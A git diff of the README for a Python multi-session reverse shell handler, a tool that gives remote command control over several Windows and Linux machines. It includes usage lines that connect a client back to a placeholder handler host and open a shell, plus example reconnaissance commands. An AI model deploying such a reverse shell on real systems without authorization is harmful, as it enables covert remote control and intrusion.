@@ -1,124 +1,143 @@
 # Multi-Session Reverse Shell Handler
 
-A cross-platform Python-based reverse shell system that supports multiple concurrent sessions with an interactive management interface.
+A cross-platform Python-based reverse shell system that enables centralized management of multiple remote systems through an interactive console interface.
 
-## Overview
+## Description
 
-This system consists of two components:
-- **Client** (`client.py`): Cross-platform reverse shell client that connects to the handler
-- **Handler** (`handler.py`): Multi-session management server that can handle up to 5 concurrent connections
+Multi-Session Reverse Shell Handler is a remote administration tool that allows system administrators and security professionals to manage multiple remote connections simultaneously from a single centralized interface. The system consists of a cross-platform client that connects back to a multi-threaded handler capable of managing up to 5 concurrent sessions.
 
 ## Features
 
-- Cross-platform compatibility (Windows and Linux)
-- Multiple concurrent session management (up to 5 sessions)
-- Interactive session switching and control
-- Persistent directory navigation with `cd` command
-- Command timeout management
-- Real-time session monitoring
-- Colored output for better visualization
-- Automatic session cleanup on disconnection
+* **Multi-session Management** - Handle up to 5 concurrent remote connections
+* **Cross-platform Compatibility** - Works on both Windows and Linux systems
+* **Interactive Session Switching** - Seamlessly switch between different remote systems
+* **Persistent Directory Navigation** - Maintain working directory state across commands
+* **Real-time Session Monitoring** - View connection status and activity timestamps
+* **Command Timeout Management** - Configurable timeouts for long-running commands
+* **Structured Output Protocol** - Clean, parseable command output format
+* **Automatic Cleanup** - Handles disconnections and resource management
+* **Colored Interface** - Visual feedback with ANSI color support
 
 ## Installation
 
-No external dependencies required. Uses only Python standard library modules.
+Clone the repository:
+```bash
+git clone https://github.com/username/multi-session-handler.git
+cd multi-session-handler
+```
+
+No additional dependencies required - uses Python standard library only.
 
 **Requirements:**
-- Python 3.6 or higher
-- Network connectivity between client and handler
+* Python 3.6 or higher
+* Network connectivity between systems
+
+## Quick Start
+
+1. **Start the handler** on your control machine:
+```bash
+python3 handler.py --port 4444
+```
+
+2. **Connect clients** from remote systems:
+```bash
+python3 client.py --host <HANDLER_IP> --port 4444
+```
+
+3. **Manage sessions** through the interactive console:
+```bash
+MultiHandler> sessions          # List all sessions
+MultiHandler> session a1b2c3d4  # Switch to specific session
+MultiHandler> ls -la            # Execute commands on active session
+```
 
 ## Usage
 
-### Starting the Handler
-
-```bash
-python3 handler.py --port <PORT> [--max-sessions <MAX>]
-```
-
-**Arguments:**
-- `--port, -p`: Port to listen on (required)
-- `--max-sessions, -m`: Maximum concurrent sessions (default: 5)
-
-**Example:**
-```bash
-python3 handler.py --port 4444 --max-sessions 5
-```
-
-### Connecting Clients
-
-```bash
-python3 client.py --host <HOST> --port <PORT> [OPTIONS]
-```
-
-**Arguments:**
-- `--host, -H`: IP/hostname of the handler (required)
-- `--port, -p`: Port of the handler (required)
-- `--timeout, -t`: Command timeout in seconds (default: 600)
-- `--no-color`: Disable ANSI colors in prompt
-- `--long-prompt`: Show full current working directory in prompt
-
-**Example:**
-```bash
-python3 client.py --host 192.168.1.100 --port 4444
-```
-
-## Handler Commands
-
-### Session Management
+### Handler Commands
 
 | Command | Description |
 |---------|-------------|
-| `sessions` | Display all active sessions with details |
-| `session <id>` | Switch to specific session using session ID |
+| `sessions` | Display all active sessions |
+| `session <id>` | Switch to specific session |
 | `kill <id>` | Terminate specific session |
-| `killall` | Terminate all active sessions |
-| `help` | Display available commands |
-| `exit` | Exit the handler |
+| `killall` | Terminate all sessions |
+| `help` | Show available commands |
+| `exit` | Exit handler |
 
-### System Commands
+### Client Options
 
-Any command not listed above will be sent to the currently active session for execution.
+```bash
+python3 client.py --host <HOST> --port <PORT> [OPTIONS]
 
-## Session Information Display
+Options:
+  -H, --host          Handler IP address (required)
+  -p, --port          Handler port (required)  
+  -t, --timeout       Command timeout in seconds (default: 600)
+  --no-color          Disable ANSI colors
+  --long-prompt       Show full directory path
+```
 
-The `sessions` command shows:
-- **ID**: Unique 8-character session identifier
-- **Address**: Client IP and port
-- **Connected**: Time since connection established
-- **Last Activity**: Time since last command execution
-- **Info**: System information from client
-- **Active Marker**: Asterisk (*) indicates current active session
+### Handler Options
 
-## Client Features
+```bash
+python3 handler.py --port <PORT> [OPTIONS]
 
-### Built-in Commands
+Options:
+  -p, --port          Listen port (required)
+  -m, --max-sessions  Maximum concurrent sessions (default: 5)
+```
 
-- `cd <directory>`: Change directory (persistent across commands)
-- `pwd`: Print current working directory
-- `exit` or `quit`: Disconnect from handler
+## Example Session
 
-### Cross-platform Compatibility
+```bash
+$ python3 handler.py --port 4444
+[+] Listening on port 4444 (max 5 sessions)
 
-The client automatically detects the operating system and handles:
-- **Windows**: Internal CMD commands (`dir`, `type`, `echo`, etc.)
-- **Linux**: Standard shell commands (`ls`, `cat`, `ps`, etc.)
-- **Path normalization**: Automatic path format conversion
-- **Home directory resolution**: Cross-platform home directory handling
+[+] New session: a1b2c3d4 from 192.168.1.50:12345
+[*] Info: Connected - Running on Windows 10
 
-## Protocol Details
+[+] New session: e5f6g7h8 from 10.0.0.100:54321
+[*] Info: Connected - Running on Linux Ubuntu 20.04
 
-### Communication Format
+MultiHandler(a1b2c3d4)> sessions
 
-Commands and responses use a delimiter-based protocol:
-- Commands are sent as newline-terminated strings
-- Responses include structured output with delimiters
-- End-of-output marker: `<<<END_OF_OUTPUT>>>`
+=== Active Sessions ===
+ID         Address              Connected  Last Activity  Info
+---------------------------------------------------------------
+a1b2c3d4   192.168.1.50:12345  2m         30s            Windows 10 *
+e5f6g7h8   10.0.0.100:54321    1m         45s            Linux Ubuntu 20.04
 
-### Response Structure
+MultiHandler(a1b2c3d4)> dir
+=== CMD: dir
+=== EXIT CODE: 0
+--- STDOUT ---
+Directory of C:\Users\admin
+...
 
+MultiHandler(a1b2c3d4)> session e5f6g7h8
+[+] Switched to session: e5f6g7h8
+
+MultiHandler(e5f6g7h8)> ls -la
+=== CMD: ls -la  
+=== EXIT CODE: 0
+--- STDOUT ---
+drwxr-xr-x 25 user user 4096 Sep 14 10:30 .
+...
+```
+
+## Protocol
+
+The system uses a delimiter-based protocol for structured communication:
+
+**Command Format:**
+```
+<command>\n
+```
+
+**Response Format:**
 ```
 === CMD: <command>
-=== EXIT CODE: <code>
+=== EXIT CODE: <return_code>
 --- STDOUT ---
 <stdout_content>
 --- STDERR ---
@@ -126,107 +145,63 @@ Commands and responses use a delimiter-based protocol:
 <<<END_OF_OUTPUT>>>
 ```
 
-## Examples
+## Cross-Platform Support
 
-### Basic Session Management
+### Windows
+* Automatic handling of internal CMD commands (`dir`, `type`, `echo`)
+* Path normalization with backslashes
+* Windows-specific system commands (`ipconfig`, `tasklist`, `systeminfo`)
 
-```bash
-# Start handler
-$ python3 handler.py --port 4444
+### Linux
+* Standard shell command execution
+* POSIX path handling
+* Unix-specific commands (`ps`, `netstat`, `uname`)
 
-# View active sessions
-MultiHandler> sessions
+## Security Notice
 
-=== Active Sessions ===
-ID         Address           Connected    Last Activity Info
---------------------------------------------------------------------------------
-a1b2c3d4   192.168.1.50:12345   2m          30s          Windows 10 *
-e5f6g7h8   10.0.0.100:54321     1m          45s          Linux Ubuntu 20.04
+This tool is intended for legitimate system administration and authorized security testing purposes only. Users must:
 
-# Switch between sessions
-MultiHandler(a1b2c3d4)> session e5f6g7h8
-[+] Switched to session: e5f6g7h8 (10.0.0.100:54321)
+* Only use on systems they own or have explicit written permission to test
+* Comply with all applicable local, state, and federal laws
+* Implement appropriate security measures in production environments
+* Consider using encrypted channels for sensitive communications
 
-# Execute commands on active session
-MultiHandler(e5f6g7h8)> ls -la
-MultiHandler(e5f6g7h8)> cd /tmp
-MultiHandler(e5f6g7h8)> pwd
-```
+## Contributing
 
-### Cross-platform Command Examples
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feature/new-feature`)
+3. Commit your changes (`git commit -am 'Add new feature'`)
+4. Push to the branch (`git push origin feature/new-feature`)
+5. Create a Pull Request
 
-**Windows Client:**
-```bash
-MultiHandler(win_client)> dir
-MultiHandler(win_client)> ipconfig
-MultiHandler(win_client)> systeminfo
-MultiHandler(win_client)> tasklist
-```
+## License
 
-**Linux Client:**
-```bash
-MultiHandler(linux_client)> ls -la
-MultiHandler(linux_client)> ifconfig
-MultiHandler(linux_client)> uname -a
-MultiHandler(linux_client)> ps aux
-```
-
-## Security Considerations
-
-This tool is designed for legitimate system administration and authorized penetration testing purposes. Users must ensure compliance with applicable laws and regulations.
-
-- Use only on systems you own or have explicit permission to test
-- Implement appropriate network security measures
-- Consider encryption for sensitive environments
-- Monitor and log usage as required by your security policies
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Troubleshooting
 
-### Connection Issues
+### Common Issues
 
-- Verify network connectivity between client and handler
-- Check firewall rules on both systems
-- Ensure correct IP address and port configuration
-- Verify Python version compatibility
+**Connection Refused:**
+* Verify handler is running and listening on correct port
+* Check firewall rules on both systems
+* Ensure network connectivity between systems
 
-### Session Management
+**Session Not Responding:**
+* Check network stability
+* Verify command timeout settings
+* Use `sessions` command to check connection status
 
-- Use `sessions` command to verify active connections
-- Check for network interruptions if sessions disappear
-- Monitor system resources if handling maximum sessions
-- Review timeout settings for long-running commands
+**Platform-Specific Commands Failing:**
+* Verify command availability on target system
+* Check user permissions and privileges
+* Review system PATH configuration
 
-### Platform-specific Issues
+## Changelog
 
-**Windows:**
-- Some commands may require elevated privileges
-- Path separators are automatically normalized
-- Internal CMD commands are handled appropriately
-
-**Linux:**
-- Verify shell availability and permissions
-- Check command availability in system PATH
-- Consider user privilege limitations
-
-## Technical Details
-
-### Threading Model
-
-The handler uses a multi-threaded architecture:
-- Main thread handles user input and command processing
-- Listener thread accepts new connections
-- Each session maintains thread-safe communication locks
-
-### Resource Management
-
-- Automatic cleanup of disconnected sessions
-- Connection timeout handling
-- Memory-efficient buffering for large command outputs
-- Graceful shutdown with resource cleanup
-
-### Error Handling
-
-- Network disconnection recovery
-- Command execution timeout management
-- Cross-platform compatibility error handling
-- User input validation and sanitization
+### v1.0.0
+* Initial release
+* Multi-session management
+* Cross-platform client support
+* Interactive handler console
+* Structured communication protocol
